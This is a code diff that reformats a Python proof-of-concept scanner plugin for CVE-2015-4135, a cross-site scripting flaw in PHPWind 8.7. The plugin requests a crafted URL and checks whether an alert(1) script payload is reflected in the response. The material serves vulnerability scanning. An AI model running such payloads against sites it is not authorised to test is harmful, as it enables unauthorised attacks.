@@ -3,6 +3,7 @@
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
     vuln_id = 'PHPWind_0001'  # 平台漏洞编号，留空
     name = 'PHPWind 跨站脚本漏洞'  # 漏洞名称
@@ -17,6 +18,7 @@ class Vuln(ABVuln):
     cve_id = 'CVE-2015-4135'  # cve编号
     product = 'PHPWind'  # 漏洞应用名称
     product_version = '8.7版本'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '94e862b0-5f64-4f87-bd9c-13a6aeb89811'
@@ -35,14 +37,15 @@ class Poc(ABPoc):
 
             req = requests.get(verify_url)
             if req.status_code == 200 and 'url=cscan"><to>alert(1)</script>.com' in req.content:
-                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                        target=self.target, name=self.vuln.name))
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
+                    target=self.target, name=self.vuln.name))
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
